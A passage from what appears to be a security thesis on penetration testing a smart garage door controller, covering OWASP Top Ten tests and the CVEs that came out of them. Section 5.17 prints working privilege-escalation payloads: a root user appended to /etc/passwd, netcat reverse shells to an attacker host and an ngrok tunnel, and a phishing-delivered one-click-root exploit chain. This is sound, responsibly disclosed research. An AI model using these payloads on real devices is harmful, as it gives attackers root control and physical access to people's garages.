7 < foo >& xxe ; </ foo >

25https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-

XML_External_Entities_(XXE) | Published unknown, visited 2020-06-04

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
71

RESULT & DISCUSSION

5.11.2 Method

First the usage of XML needed to be identiﬁed. It was done by looking at the
output from the phpinfo() function to see if XML was enabled. Then searching
for ﬁles using XML or SOAP 26 on the web server was done to enumerate them.

In PHP when using DOM, SimpleXML or XMLReader, the application is vul-
nerable to XXE by default due to their dependency of libxml2 27. To protect
against XXE in PHP, OWASP 28 recommends to disable the loading of external
entities for each usage of XML requests. Therefore, searching for the usage of
the function libxml_disable_entity_loader() was done. If it would have been
set to true, it would have protected the XML request from XXE.

Burp Suite Professional’s vulnerability scanner was used to scan for XXE vul-
nerabilities 29.

5.11.3 Result

According to the output from phpinfo(), libxml version 2.9.4 was enabled,
along with DOM, SimpleXML, XMLReader and SOAP.

No ﬁle was found using the function libxml_disable_entity_loader().

The vulnerability scanner could not ﬁnd any potential XXE vulnerabilities.

5.11.4 Discussion

The fact that the vulnerability scanner could not ﬁnd any XXE was a strong
result saying that no user provided input is using external entities. There were
ﬁles identiﬁed on the server using XML for e.g. reporting error messages, but
none of them seemed to communicate with the client.

26https://www.w3schools.com/xml/xml_soap.asp | Published unknown, visited 2020-06-

24

27https://phpsecurity.readthedocs.io/en/latest/_articles/PHP-Security-Default-

Vulnerabilities-Security-Omissions-And-Framing-Programmers.htmlxml-injection-attacks |
Published 2017, visited 2020-06-04

28https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

| Published unknown, visited 2020-06-04

29https://portswigger.net/web-security/xxe | Published unknown, visited 2020-06-04

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

72
RESULT & DISCUSSION

5.12 Exploitation Task 11: Broken Access Con-

trol

Broken access control comes from OWASP Top Ten.

5.12.1 Background

Access control is management of the actions a digital identity can carry out
on resources. Meaning that a user should not be able to perform actions that
they do not have permission for 30.

There are diﬀerent models of access control that can be implemented. Manda-
tory Access Control (MAC), Attribute-Based Access Control (ABAC), Access
Control Lists (ACL) and Role-Based Access Control (RBAC) are some exam-
ples of models. In UNIX systems the Discretionary Access Control (DAC) is
used. It says that the owner of an object can specify who gets permissions to
the object/resource. DAC is based on the user’s identity and groups.

The models have two things in common: authentication and authorization.
Authentication is to verify the claimed identity of an entity (could be a human
user or a system user). It is answering the question are you who you say you
are? by for example enforcing credentials or multi-factor authentication. Au-
thorization it the functionality of specifying access/privilege to resources. It
is answering the question what is identity X allowed to do? by having deﬁned
access policy.

Consequences of broken access control are potential information disclosure,
tampering of data, denial of service by deleting data, or performing business
functions that requires higher privileges 31.

5.12.2 Method

The user’s ability to perform requests as a more privileged user was tested.
The test was set up by creating two normal users (Allan and Alice) and select-
ing web pages that the normal user should not have access to.

30https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-

Broken_Access_Control | Published unknown, visited 2020-06-05

31https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-

Broken_Access_Control | Published unknown, visited 2020-06-05

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
73

RESULT & DISCUSSION

The selected web page were:

1. The overview of all user accounts. Only Admin should have access to

that web page.

2. The update user account page for the user Allan. Only Admin should
have access to it. (There is a separate web page for Allan to use to up-
date their own account details. To keep track of the two pages, the page
accessible to normal users is called proﬁle page in this work).

3. The proﬁle page of Alice. Only Alice should be able to access it.

All three web pages were tested while being logged in as the normal user Al-
lan. A proxy was set up through Burp to intercept the requests and to alter
them to replicate a request to the targeted web page. The requests used are
described below for each of the three web pages.

The ﬁrst test was to try to access the overview of all user accounts as a normal
user. The legit GET request 32 to access the web page was the following:

GET /index.php?op=config&opc=users HTTP/1.1
Host: 192.168.1.100
Referer: http://192.168.1.100/index.php
Cookie: PHPSESSID=tda64bgc02k2s3tfvpm71cdu62
Connection: close

It was submitted as a GET, POST and PUT request to see if the access control
was missing from the other types of requests.

The second test was to be able to update the email address of Allan, but instead
of using the allowed way of doing it (through Allan’s own proﬁle page), it was
done via the user account page of Allan made for Admin. The legit POST
request 33 to update the email address of Allan, when logged in as Admin was
the following:

POST /index.php HTTP/1.1
Host: 192.168.1.100
Origin: http://192.168.1.100
Content-Type: application/x-www-form-urlencoded

32Irrelevant request headers have been left out to make the request easier to read.
33Irrelevant request headers have been left out to make the request easier to read.

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

74
RESULT & DISCUSSION

Referer: http://192.168.1.100/index.php
Cookie: PHPSESSID=tda64bgc02k2s3tfvpm71cdu62
Connection: close

password=********&password2=********&user_name=allan&
email=allan%40allan.random&sel_language=en&pin=1337&
comment=hejsan&update-login=allan&login_privileges=
allan&op=config&opc=users&op_user=edit-user&user-
update=Update

The third test was to access the proﬁle page of Alice. The request was audited
to identify which parameters were used to tell the server whose proﬁle page to
display. The legit GET request 34 for a normal user to access their own proﬁle
page was the following:

GET /index.php?op=edit_profile HTTP/1.1
Host: 192.168.1.100
Referer: http://192.168.1.100/index.php
Cookie: PHPSESSID=tda64bgc02k2s3tfvpm71cdu62
Connection: close

5.12.3 Result

It was not possible for a user to act outside of its privileges.

Test 1

When trying to access the overview web page of all users, the GET, POST and
PUT requests gave a 200 OK response, but they did not display the correct
web page. Instead the proﬁle page of Allan was displayed.

Test 2

When trying to send the POST request, used by Admin to alter the email ad-
dress of Allan, the request was sent and got back a 200 OK response, but the
email address did not get updated.

34Irrelevant request headers have been left out to make the request easier to read.

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
75

RESULT & DISCUSSION

Test 3

When trying to view the proﬁle page of another user the GET request was
audited. One parameter was sent in the URL op=edit_proﬁle, and it was the
same value for all users when trying to access their own proﬁle page. A ses-
sion cookie was sent and when using the session cookie of another user, the
retrieved proﬁle pages was of the user account connected to the submitted ses-
sion cookie.

5.12.4 Discussion

From the tests that were made, no vulnerability was found for broken access
control. It seems that the access control is secure.

More tests could be done by auditing the implemented access control in the
source code. It would be interesting to test the time and date restrictions set to
the users. It was left out due to limit of time.

5.13 Exploitation Task 12: Security Miscon-

ﬁguration

Security misconﬁguration comes from OWASP Top Ten.

5.13.1 Background

Setting up a secure system is not always an easy task, and the idiom a chain is
no stronger than its weakest link becomes very clear when there is a miscon-
ﬁguration in place.

Installing a system or component could potentially bring by-default vulner-
abilities that should be mitigated. For example an attacker could use previous
knowledge about default credentials to access the system, or exploit enabled
features that are not even used in the system 35.

There are security features that are easy to implement when using a stan-
dard web server, software language or framework. For example OWASP has
a project that lists ten security headers that can be enabled to help protecting

35https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-

Security_Misconﬁguration | Published unknown, visited 2020-06-05

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

76
RESULT & DISCUSSION

against easily preventable vulnerabilities for modern browsers. The project is
called OWASP Secure Headers Project 36.

5.13.2 Method

Four tests were done:

1. Default accounts found in the installation instructions were tried.

2. Error messages identiﬁed during the other exploitation tasks were iden-

tiﬁed.

3. Security headers in responses sent by the web server, were enumerated
and audited. The headers of interest were taken from OWASP Secure
Headers Project 37.

4. The session cookie used was audited for its ﬂags: Domain, Expires,

HttpOnly, HostOnly, Secure, sameSite 38.

5.13.3 Result

Test 1

The controller came with default credentials (username set to admin and a
blank password). During the installation of the controller, the user was forced
to set a password for the admin account. After the password was set, it was
not possible to log in with the previous blank password.

Test 2

When typing the wrong password a message shows up indicating that the pass-
word was wrong. When typing the wrong username a message shows up indi-
cating that the account does not exists. See ﬁgure 5.11. The web application
is vulnerable to user enumeration.

36https://owasp.org/www-project-secure-headers/ | Published unknown, visited 2020-06-

05

05

37https://owasp.org/www-project-secure-headers/ | Published unknown, visited 2020-06-

38https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies | Published 2020-06-03,

visited 2020-06-05

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
77

RESULT & DISCUSSION

(a)

(b)

Figure 5.11: (a) Message displayed after typing a non-existing account (b)
Message displayed after typing the wrong password

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

78
RESULT & DISCUSSION

Test 3

• HTTP Strict Transport Security (HSTS): did not exist

• Public Key Pinning Extension for HTTP (HPKP): did not exist

• X-Frame-Options: did not exist

• X-XSS-Protection: did not exist

• X-Content-Type-Options: did not exist

• Content-Security-Policy: did not exist

• X-Permitted-Cross-Domain-Policies: did not exist

• Referrer-Policy: did not exist

• Expect-CT: did not exist

• Feature-Policy: did not exist

Test 4

The session cookie PHPSESSID had the attributes seen below:

• Domain: the local IP address of the web application.

Only the domain of the web server is allowed to receive the cookie.

• Expires: Session

The cookie is deleted when the current session ends.

• HostOnly: true

The request’s host must exactly match the domain of the cookie.

• HttpOnly: false

It is vulnerable to access attempts to cookie values through JavaScript.

• Secure: false

It is vulnerable to eavesdropping and man-in-the-middle attacks.

• sameSite: Unset

It is vulnerable to having the session cookie sent with cross-origin re-
quest.

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
79

RESULT & DISCUSSION

5.13.4 Discussion

User enumeration can be done remotely by an attacker, since the web applica-
tion has by default remote access enabled. That in combination with all devices
having the same username for the administrator makes credential brute-force
attacks easier.

The response headers investigated in test 3 mostly require that a modern browser
is used. If the victim does not use a modern browser that supports the security
headers, an attacker could still launch an successful attack against the victim.

As the web application is built in ﬁrmware version 1.5.9 it relies on having the
session cookie ﬂag Secure set to false. That is because only HTTP is available
for communicating with the local web application. When setting the Secure
ﬂag to true, the cookie will only be submitted over HTTPS.

5.14 Exploitation Task 13: Insecure Deseri-

alization

Insecure deserialization comes from OWASP Top Ten.

5.14.1 Background

Serialization is when an object is transformed into a data format 39. JSON and
XML are examples of a data formats. It is used to store or transmit objects.
Deserialization is the opposite, meaning the process of transforming data into
an object.

Consequences of deserialization vulnerabilities could lead to remote code ex-
ecution or be used to perform replay attacks, injection attacks and privilege
escalation attacks 40.

5.14.2 Method

Since access to the source code had been obtained, the method could be de-
signed from a whitebox perspective. The usage of the PHP function unserial-

39https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html | Pub-

lished unknown, visited 2020-06-06

40https://owasp.org/www-project-top-ten/ | Published 2020, visited 2020-04-01

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

80
RESULT & DISCUSSION

ize() was audited for how the external parameters were accepted.

5.14.3 Result

One ﬁle on the web server, called ﬁle A, was found to call the function unseri-
alize(). File A took the input from the call of itself and fed it to unserialize().

Four calls to ﬁle A were found in four separate ﬁles B-E. Files B-E all used
escapeshellargs() to prevent any attacks involving command injection. The
arguments sent to ﬁle A were objects from the user database. The objects con-
tained two ﬁelds of data that were provided by the user: email address and
login username.

5.14.4 Discussion

The usage of deserialization was identiﬁed in the web application, together
with its connection of user input.

The actual testing of injecting malicious payload to the email address and the
username was left out due to time constraint. This means that the web appli-
cation has potential for being vulnerable, but it has not been conﬁrmed in this
work. A continuation of the testing is left for future work.

5.15 Exploitation Task 14: Using Components

with Known Vulnerabilities

Using components with known vulnerabilities comes from OWASP Top Ten.

5.15.1 Background

Just because a system once was secure, it does not mean that it continues to
be so. New vulnerabilities get discovered, and with them comes new security
patches that need to be installed.

Previously disclosed vulnerabilities often have functional exploits tailored for
them, that anyone can get access to. This makes it easy for an adversary to

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
81

RESULT & DISCUSSION

attack an unpatched system 41.

5.15.2 Method

Version numbers were identiﬁed from vulnerability scans and from having
access to the web server.

5.15.3 Result

The current versions of software components are shown in table 5.2, paired
with their latest versions.

Outdated Software
Software Used version Latest version

PHP
Nginx
SQLite
OpenSSH

5.6.18
1.8.1
3.11.0
7.1

7.4.6
1.19.0
3.32.2
8.3

Table 5.2: Software versions used in the controller.

5.15.4 Discussion

Multiple components were not up-to-date, and that was the initial indication
for focusing the scope of the exploitation on the web application of the con-
troller.

Potential vulnerabilities could be present in the old versions of the compo-
nents. During the Nessus scan the PHP version number pointed to many dif-
ferent types of overﬂow vulnerabilities. Only two of the potential ﬁndings
from the Nessus scan had implemented Metasploit exploits (tested in section
5.6 and 5.7), the rest were left out of scope due to the diﬃculty of testing them.
This could be investigated in future work.

41https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A9-
Using_Components_with_Known_Vulnerabilities | Published unknown, visited 2020-06-06

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

82
RESULT & DISCUSSION

5.16 Exploitation Task 15: Insuﬃcient Log-

ging & Monitoring

Insuﬃcient logging and monitoring comes from OWASP Top Ten.

5.16.1 Background

Without proper logging and monitoring of activity, adversaries could perform
attacks without being detected 42. An adversary could stay in a system for
months to gather information or to wait for an opportunity to advance the at-
tack.

Early detection of intrusion could help mitigating the severity of the attack,
for example by stopping attempts to lateral movement or escalation of privi-
lege. Even abuse of privileges or access from insiders could be detected.

5.16.2 Method

Logs available to Admin were identiﬁed.

Tests were made to see how the controller handled loss of power, which is
a potential scenario if an adversary gets physical access to the device.

5.16.3 Result

Admin had access to a calendar called Door Events where the logs were kept.
After the storage reached 1 GB the older logs were deleted. The log contained
which user opened which door, if the door got opened/closed without a user
requesting the opening/closing and when the controller started. Notiﬁcations
can be enabled to be sent out via email or as a push notiﬁcation in the mobile
app. Notiﬁcations can be triggered for doors left open, battery status of the tilt
sensor or if the temperature changes.

The user will only be notiﬁed once the power is turned back on in the log
with the message The iSmartgate device has started and the time of when it
got powered on again (see ﬁgure 5.12). No notiﬁcation is sent out via email

42https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A10-

Insuﬃcient_Logging%252526Monitoring | Published unknown, visited 2020-06-06

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
83

RESULT & DISCUSSION

or as a push notiﬁcation. Everything that happened during the power loss do
not get recorded.

Figure 5.12: The log indicating that the device has been turned on

5.16.4 Discussion

If the remote access is enabled, the owner would be able to detect a connection
problem if the power was cut from the controller by not being able to access
the remote website.

There is a section called system logs when logged in as Admin, but it remained
empty through the whole testing of the device. Not sure if there are logs that
should be available to the user that are not.

There is a button for deleting the log in the admin panel. If an attacker gets ac-
cess to the web application, either as Admin or shell access, they could delete
the logs and hide the intrusion.

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

84
RESULT & DISCUSSION

5.17 Post Exploitation Task 1: Privilege Es-

calation

Privilege escalation was explored after the unrestricted ﬁle upload vulnerabil-
ity was discovered in section 5.4.

5.17.1 Background

Privilege escalation is used to gain more access in a system. The ultimate goal
in a UNIX system is to have root access, since that is the highest set of privi-
leges a user can have.

The consequences of escalating privileges could be access to sensitive data,
possibility to modify data, cause denial of service, or code execution. It could
be used to pivot inside the network and jump to other machines.

Normally escalation of privileges is done after getting a shell on the server.
When getting a shell, the adversary is acting as one of the user in the system, a
common user for nginx and apache web servers is www-data. There are diﬀer-
ent ways to go from www-data to root. For example bypassing authentication
or utilizing misconﬁgured ﬁle access.

In the case of utilizing misconﬁgured ﬁle access, the goal is to ﬁnd a ﬁle that
root will execute and that www-data can write to. A common place to look for
misconﬁgured ﬁle access is in cron jobs. Cron itself is a software utility used
to schedule time-based tasks in Unix-based systems 43. Cron jobs can be spec-
iﬁed for speciﬁc users or system-wide in ﬁles called crontabs. The crontabs
of interest are the root user crontab and the system crontab, since these are the
crontabs that the root user could be speciﬁed to execute the scheduled tasks.

If www-data has permission to write to a crontab or a ﬁle that the cron job
is executing, it means that the adversary could inject malicious code to a ﬁle
that will be run by root. Even if the permission is to only read a crontab, that
could bring useful information about other calls that root will do.

Once a useful ﬁle has been identiﬁed a payload needs to be injected in or-

43https://cronitor.io/cron-reference?utm_source=crontabguruutm_campaign=cron_reference

| Published unknown, visited 2020-06-11

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
85

RESULT & DISCUSSION

der to escalate the privileges. There are multiple of methods that could be
used. The three that were used in the post-exploitation task were based on ﬁle
privileges, user privileges and reverse shells.

A reverse shell is used when the attacker wants to use a shell on the target
system, but the shell connection is actually initiated by the targeted machine
to the attacker’s machine. It is the reverse order based on where the attacker
is placed. The reverse shell is set up by opening a port on the attacker’s ma-
chine, and having the targeted machine initiating the communication together
with executing a shell program on its own machine (the targeted machine) 44.
See ﬁgure 5.13 where the IP address 192.168.1.104 belongs to the attacker’s
machine.

Figure 5.13: Description of a reverse shell with the netcat commands used

5.17.2 Method

First the cron jobs were inspected to see if there was any crontab that www-
data had access to.

Then other ﬁles, that www-data was the owner of, were inspected to deter-
mine if they get executed by root. The ﬁles owned by www-data were mostly
written in PHP, thus a short script was added to the ﬁles. The script would
print to a dummy ﬁle the name of the user who ran it and the timestamp of the
execution. After 24 hours, the dummy ﬁle was manually checked to see if any
www-data owned ﬁles had been executed by root. The used PHP script was:

1 $file = " / var / www / d u m m y f i l e . txt " ;
2 $ h a n d l e r = fopen ( $file , 'a ') ;
3 $ s t r i n g = " / var / wwww / f i l e n a m e . php user : " . p o s i x _ g e t p w u i d (

p o s i x _ g e t e u i d () ) [ ' name ' ] . date ( " F j , Y , G : i : s T " ) . " \ n " ;

44https://resources.infosecinstitute.com/icmp-reverse-shell/gref | Published 2018-01-04,

visited 2020-06-11

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

86
RESULT & DISCUSSION

4 f w r i t e ( $handler , $ s t r i n g ) ;
5 f c l o s e ( $ h a n d l e r ) ;

After the above ﬁles were identiﬁed, one was selected to have a PHP script
inserted to it. What the PHP script should contain was tested in three tests.
The goal of the tests was to escalate from www-data to root:

1. Change SUID for /bin/bash

2. Add new user with root privileges

3. Open up a reverse shell from the target to the attacker

Change SUID for /bin/bash

The set owner user ID (SUID) is a special type of permission that could be
given to a ﬁle 45. Normally in Linux/Unix systems when a program is exe-
cuted it inherits the privileges of the logged in user. With the SUID set for
a program, the user executing the program temporarily inherits the privileges
of the owner of the program. In this case, the program /bin/bash is owned by
root, thus the root privileges should be provided to www-data when executing
the program.

The payload used was:

1 chmod ( " / bin / bash " , 0 4 7 5 5 ) ;

The PHP function chmod() has the same functionality as the bash command
chmod, modifying the ﬁle permissions. By setting the second integer to 4, it
will enable the SUID for the speciﬁed ﬁle /bin/bash.

After the payload was executed, the already obtained shell from the ﬁle up-
load vulnerability (see section 5.4) was used to login to the web server and
run the program /bin/bash.

Add new user with root privileges

The payload used was:

1 $ p w d f i l e = " / etc / p a s s w d " ;
2 $ h a n d l e r = fopen ( $pwdfile , 'a ') ;
3 $ s t r i n g = " c a p t a i n m a r v e l : : 0 : 0 : S y s t e m A d m i n i s t r a t o r :/ root / root :/

bin / bash " ;

4 f w r i t e ( $handler , $ s t r i n g ) ;
5 f c l o s e ( $ h a n d l e r ) ;

45https://www.linux.com/training-tutorials/what-suid-and-how-set-suid-linuxunix/ | Pub-

lished 2016-02-16, visited 2020-06-11

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
87

RESULT & DISCUSSION

The string was appended to the ﬁle /etc/passwd, which contains information
about all users in the system. By adding the string, a new user named captain-
marvel was added with the same user ID (UID) and group ID (GID) as root.
The part of the string that indicates the UID and GID are the two zeros.

After the payload was executed, an attempt was made to login through SSH to
the new user captainmarvel.

Open up a reverse shell from the target to the attacker

Instead of using the shell from the unrestricted ﬁle upload or an SSH shell
that requires the user to be on the same local network, a reverse shell could be
utilized. The payload used was:

1 s y s t e m (" nc 1 9 2 . 1 6 8 . 1 . 1 0 4 1337 -e / bin / bash ") ;

Where the IP address 192.168.1.104 points to the machine with the open port
1337. The ﬂag -e gives the instruction to execute the program /bin/bash.

The reverse shell was also tested to see if it could connect to a remote ma-
chine. To set it up, an ngrok address was obtained for a local TCP port on
the lab machine (aka the Kali machine in lab environment described in ﬁg-
ure 5.2). The program ngrok exposes local servers behind NATs and ﬁrewalls
to the public internet using secure tunnels. The web server of the controller
would connect to the remote ngrok port (wide arrow pointing to the web ap-
plication and the ngrok server in ﬁgure 5.2) which in turn would forward the
request to the local port on the lab machine (wide arrow pointing to the Kali
machine and the ngrok server in ﬁgure 5.2).

1 s y s t e m (" nc n g r o k A d d r e s s n g r o k P o r t -e / bin / bash ") ;

5.17.3 Result

The user www-data lacked permissions to read the crontabs. Instead three ﬁles
that www-data had write permission to were identiﬁed to be executed by root
within 24 hours:

1. /cron/checkExpirationDate.php

2. /cron/checkUserExpirationDate.php

3. /cron/mailAdmin.php

Two out of three tests were successful.

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

88
RESULT & DISCUSSION

Change SUID for /bin/bash

The SUID got set after the payload was executed, but when login in through
the shell the user privileges remained the same as www-data and not as root.
Not a successful privilege escalation.

Add new user with root privileges

The new user with root privileges was created, and it was possible to login as
captainmarvel. A successful privilege escalation.

Open up a reverse shell from the target to the attacker

The reverse shell connected both to the local machine (using the IP address
from the local network) and to the remote machine (using the ngrok address).
The two shells gained were both with root privileges. This test was a successful
privilege escalation.

5.17.4 Discussion

Even though it might look like the three ﬁles were cron jobs, they were not.
Instead there was a script running during the startup of the controller, it would
execute the above mentioned three ﬁles and then sleep for 24 hours before ex-
ecuting them again in a while loop.

It was unknown why the SUID approach did not succeed. It was conﬁrmed
that the owner of the ﬁle /bin/bash was root, and that the SUID got set success-
fully. Still, when logging in as www-data through the netcat shell, the return
value from typing whoami said www-data and not root.

The new user account made it easy to login through SSH and continue with
the remaining tests.

Opening up the reverse shell proved that it was possible to remotely get a root
shell, but the problem remained in how to exploit the privilege escalation vul-
nerability as a remote attacker. Further research was done to ﬁnd a way to
deliver the attack remotely. A one-click-root attack was created by combining
three vulnerabilities:

1. CSRF

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
89

RESULT & DISCUSSION

2. Unrestricted ﬁle upload

3. Privilege escalation

The attack only requires the user to click the link provided in the phishing
email sent, leading to the attacker controlled website containing the exploit.
The website has a POST form for uploading an image to the controller, but
instead of uploading an image it will upload a PHP ﬁle. The content in the
PHP ﬁle is the payload used to exploit the privilege escalation, and it can be
seen here:

1 <? php
2 $file = " / var / www / cron / c h e c k E x p i r a t i o n D a t e . php " ;
3 $ h a n d l e r = fopen ( $file , 'a ') ;
4 $ s t r i n g = ' <? php s y s t e m (" nc n g r o k A d d r e s s n g r o k P o r t -e / bin / bash

") ; ? > ';

5 f w r i t e ( $handler , $ s t r i n g ) ;
6 f c l o s e ( $ h a n d l e r ) ;
7 ? >

The ngrokAddress and ngrokPort would have to be changed to the actual val-
ues. The variable $ﬁle points to the ﬁle that root will execute and that www-
data can write to. The variable $string deﬁnes the payload to be appended to
the ﬁle.

When the targeted user click on the link in the phishing email, they will be
sent to the malicious website where a POST request is automatically sent to
the web server. The request uploads the PHP ﬁle, then in order to execute the
uploaded ﬁle the malicious website has an iframe that retrieves it. Once the
uploaded ﬁle is retrieved, it gets executed by www-data in the web server, ap-
pending the payload to the speciﬁed ﬁle that already exists on the web server.
Within 24 hours the speciﬁed ﬁle will be executed by root, and a connection
will be sent out to the attacker’s machine, creating the reverse root shell.

The PoC for the one-click-root attack can be found in appendix E in listing
E.1.

Chapter 6

Reported Vulnerabilities

A summary of the identiﬁed vulnerabilities presented in chapter 5.

6.1 CVE IDs

Eleven vulnerabilities were reported to MITRE, requesting Common Vulner-
abilities and Exposures (CVE) IDs. The CVEs were kept as reserved status to
until they got publicly released, to comply with responsible disclosure. Here
is a complete list of reported vulnerabilities:

1. CVE-2020-12282 XSS | section 5.2

2. CVE-2020-12280 CSRF to open the garage door | section 5.3

3. CVE-2020-12281 CSRF to add a user | section 5.3

4. CVE-2020-12841 CSRF to upload an image | section 5.3

5. CVE-2020-12840 CSRF to upload a sound ﬁle | section 5.3

6. CVE-2020-12837 Unrestricted ﬁle upload for the image upload func-

tionality | section 5.4

7. CVE-2020-12843 Unrestricted ﬁle upload for the sound upload func-

tionality | section 5.4

8. CVE-2020-12838 Privilege escalation for /cron/mailAdmin.php | sec-

tion 5.17

9. CVE-2020-12839 Privilege escalation for /cron/checkExpirationDate.php

| section 5.17

90

CHAPTER 6. REPORTED VULNERABILITIES

91

10. CVE-2020-12842 Privilege escalation for /cron/checkUserExpirationDate.php

| section 5.17

11. CVE-2020-13119 Clickjacking | section 5.5

6.2 Attacks Exploiting Reported Vulnerabili-

ties

The threats presented below had their attacks tested, and all of them were tar-
geting the web application of the controller. The impact and estimated proba-
bility of success have been assigned for each attack.

Estimated probability of success had the following scale:

Excellent - does not require special equipment, special circumstances or
technical knowledge above average

Good - does require one of the three: special equipment, special circum-
stances or technical knowledge above average

Poor - does require two or more of the three: special equipment, special
circumstances or technical knowledge above average

The references are taken from the Common Weakness Enumeration (CWE) list
4.0, OWASP Application Security Veriﬁcation Standard 4.0.1 (ASVS) and the
Common Attack Pattern Enumeration and Classiﬁcation (CAPEC) dictionary.

6.2.1 XSS

Attack: Session hijacking (CSRF + XSS)
Impact: An unauthenticated remote attacker could steal the session cookie of
a user. The attacker could use the session cookie to authenticate requests, for
example to open the garage door and gain physical access.
Estimated probability of success: Good. The attacker would how to know
how to set up a netcat connection and how to use the session cookie to spoof
the requests to the web application.
References: CWE-79, ASVS 5.3.3, CAPEC-591, CWE-352, ASVS 4.2.2,
CAPEC-62
Section: 5.2

92

CHAPTER 6. REPORTED VULNERABILITIES

6.2.2 CSRF

Attack: CSRF
Aﬀected asset: Functionality for opening the garage door
Impact: An unauthenticated remote attacker could open a garage door. The
attacker could gain physical access to the garage.
Estimated probability of success: Excellent. The attacker can deliver the
attack by sending the original URL, used for the GET request to open a garage
door, to the victim.
References: CWE-352, ASVS 4.2.2, CAPEC-62
Section: 5.3 ﬁnding 1

Attack: CSRF
Aﬀected asset: Functionality for creating a new user
Impact: An unauthenticated remote attacker could create a new user. The at-
tacker would have access to the camera view and be able to open and close the
garage door, thus gain physical access to the garage.
Estimated probability of success: Excellent. The attacker can deliver the
attack by sending a URL, to a malicious website with a POST form containing
the account details for the new user, to the victim. The attacker only has to
create one web page and put the POST form there.
References: CWE-352, ASVS 4.2.2, CAPEC-62
Section: 5.3 ﬁnding 2

Attack: CSRF
Aﬀected asset: Functionality to upload an image
Impact: An unauthenticated remote attacker could upload an image.
Estimated probability of success: Excellent. The attacker can deliver the
attack by sending a URL, to a malicious website with a POST form containing
the image, to the victim. The attacker only has to create one web page and put
the POST form there.
References: CWE-352, ASVS 4.2.2, CAPEC-62
Section: 5.3 ﬁnding 3

Attack: CSRF
Aﬀected asset: Functionality to upload a sound ﬁle
Impact: An unauthenticated remote attacker could upload a sound ﬁle.
Estimated probability of success: Excellent. The attacker can deliver the
attack by sending a URL, to a malicious website with a POST form containing

CHAPTER 6. REPORTED VULNERABILITIES

93

the sound ﬁle, to the victim. The attacker only has to create one web page and
put the POST form there.
References: CWE-352, ASVS 4.2.2, CAPEC-62
Section: 5.3 ﬁnding 4

6.2.3 Unrestricted File Upload

Attack: Upload PHP shell (CSRF + unrestricted ﬁle upload)
Aﬀected asset: Functionality to upload an image and the functionality to up-
load a sound ﬁle
Impact: An unauthenticated remote attacker could upload a PHP shell, or any
other ﬁle, on the web server. The attacker would have to be able to use shell
commands to communicate with the web server as www-data. Writing, read-
ing and executing ﬁles within the permissions of www-data.
Estimated probability of success: Good. The attacker would need knowl-
edge about how to bypass the ﬁle validation.
References: CWE-434, ASVS 12.2.1, CAPEC-17, CAPEC-650, CWE-352,
ASVS 4.2.2, CAPEC-62
Section: 5.4

6.2.4 Privilege Escalation

Attack: One-click-root (CSRF + unrestriced ﬁle upload + privilege escala-
tion)
Aﬀected asset: The following ﬁles on the web server
/cron/mailAdmin.php
/cron/checkExpirationDate.php
/cron/checkUserExpirationDate.php
Impact: An unauthenticated remote attacker could gain a root shell on the web
server. The attacker would have full control over the web server, being able
to read, write and execute all ﬁles. Sensitive information could be extracted,
tampering of data, causing denial of service, spooﬁng communications to ex-
ternal email servers or relay servers 1.
Estimated probability of success: Good. The attacker would have to be able
to set up a public open port for the netcat connection to work.
References: CWE-732, ASVS 4.3.3, CAPEC-233, CAPEC-650, CWE-434,

1Neither denial of service nor spooﬁng communications to external email servers or relay

servers were tested, but it could be assumed that the probability of success would be good.

94

CHAPTER 6. REPORTED VULNERABILITIES

ASVS 12.2.1, CWE-352, ASVS 4.2.2, CAPEC-62
Section: 5.17 in the discussion

6.2.5 Clickjacking

Attack: Clickjacking
Aﬀected asset: All requests on the website that requires the user to click or
drag something
Impact: An unauthenticated remote attacker could change the state of the web
server. For example open the garage door and get physical access.
Estimated probability of success: Good. The attacker would have to be able
to embed and align the decoy website with the targeted website.
References: CWE-1021, CAPEC-103, ASVS 14.4.3
Section: 5.5

Chapter 7

Discussion

This chapter contains three discussions. One that brings up the beneﬁts and
the consequences of the used methodology. A summary of the discussions
made for each post-/exploitation task in chapter 5. Followed by a discussion
of the ethics and sustainability of this study.

7.1 Methodology

The methodology used in this thesis consisted of seven phases of penetration
testing. It provided structure to the study and made sure that a thorough anal-
ysis of potential threats were made before the scope got narrowed down.

One down side of the methodology was that much of the time was initially
spent on the threat modeling. With no prior experience of conducting a threat
model, it was easy to get caught up in details. The consequence was that it
took time oﬀ from the exploitation phase. Some of the OWASP Top Ten tasks
could have been tested more in depth, but due to time constraints that was not
possible. Instead the low hanging fruits were picked from each risk described
in OWASP Top Ten. Despite the time distribution, enough vulnerabilities were
identiﬁed in order to draw a conclusion.

7.2 Result

All things considered, this product in its version 1.5.9 is not secure. The sever-
ity of the discovered vulnerabilities is high, since the impact and the probabil-
ity of a successful attack were proven to be high. An unauthenticated remote

95

96

